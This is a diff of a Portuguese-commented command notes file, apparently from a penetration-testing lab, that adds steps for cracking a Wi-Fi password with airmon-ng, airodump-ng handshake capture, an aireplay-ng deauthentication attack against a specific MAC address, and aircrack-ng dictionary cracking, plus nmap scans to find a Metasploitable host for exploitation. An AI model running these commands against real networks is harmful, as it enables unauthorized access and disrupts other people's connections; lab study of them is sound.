@@ -7,19 +7,42 @@
 
 # ------------- descobrir senha Wi-Fi 
 
-# 1) Verificar interface
+# 0) Identificar interfaces aptas para execução do aircrack-ng.
+# iwconfig
+
+# 0.1) É recomendado matar os processos de conexão wireless que podem interferir na captura (ou apenas desligar seu Wi-Fi).
+# sudo airmon-ng check kill
+
+# 1) Ativar o modo monitor 
 # sudo airmon-ng start wlan0
 
+# Confirme com a mudança: algo como wlan0mon com Mode:Monitor.
+# iwconfig
+
+# Varredura para encontrar/listar a(s) rede(s). Pressione Ctrl+C para parar a varredura.
+# sudo airodump-ng wlp1s0mon
+
 # 1) Capturar handshake
-# sudo airodump-ng wlan0mon --essid XPTO -w captura
+#airodump-ng --channel <CANAL_ALVO> --bssid <MAC_DO_ALVO> -w <CAPTURA_DE_DADOS>
+<IFACE_MONITORAMENTO>
+# sudo airodump-ng -c 6 --bssid 80:58:F8:EE:C1:7E -w captura_xpto wlp1s0mon
+
+	### Um ataque de desautenticação será executado em outro terminal. Não interromper a captura! ###
+		# aireplay-ng -0 2 -a <MAC_DO_ALVO> -c <MAC_DE_ALGUM_CLIENTE> --ignore-negative-one
+		<IFACE_MONITORAMENTO>
+		# sudo iwconfig wlp1s0 channel 2
+		sudo aireplay-ng -0 5 -a 80:8F:E8:86:0D:FD wlp1s0   # tentar broadcast
 
 # 3) Quebrar senha com aircrack-ng
 # sudo aircrack-ng -w /caminho/para/dicionário.txt captura-01.cap
 
 # ------------- Usar nmap para escanear a rede, identifique a Metasploitable e explore vulnerabilidades conhecidas (ex: vsftpd, UnrealIRCd, bindshell(root shell. porta: 1524)...).
 
-# nmap -sV -O 192.168.1.0/24
-
+# sudo nmap -sn -PR 192.168.1.0/24
+		# Ou 'sudo arp-scan --localnet' do Net-tools para listar ocultos pela tabela ARP.
+	
+# sudo nmap -sV -O 192.168.1.9
+		# para detalhar um host específico.
 
 # -------------- Tentar usuário e senha:
 
